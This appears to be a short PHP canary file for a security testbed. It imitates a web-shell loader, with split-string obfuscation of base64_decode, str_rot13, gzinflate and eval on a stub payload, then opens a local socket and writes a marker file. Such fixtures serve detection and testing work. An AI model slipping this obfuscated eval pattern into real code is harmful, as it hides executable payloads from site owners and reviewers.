<?php
$p = 'ba'.'se64_de'.'code';
eval(gzinflate(str_rot13($p('H4sIAAAA'))));
$s=@fsockopen('127.0.0.1',18905);@file_put_contents(getenv('SIGHTREAD_CANARY_DIR').'/b05','x'); // testbed canary: never runs
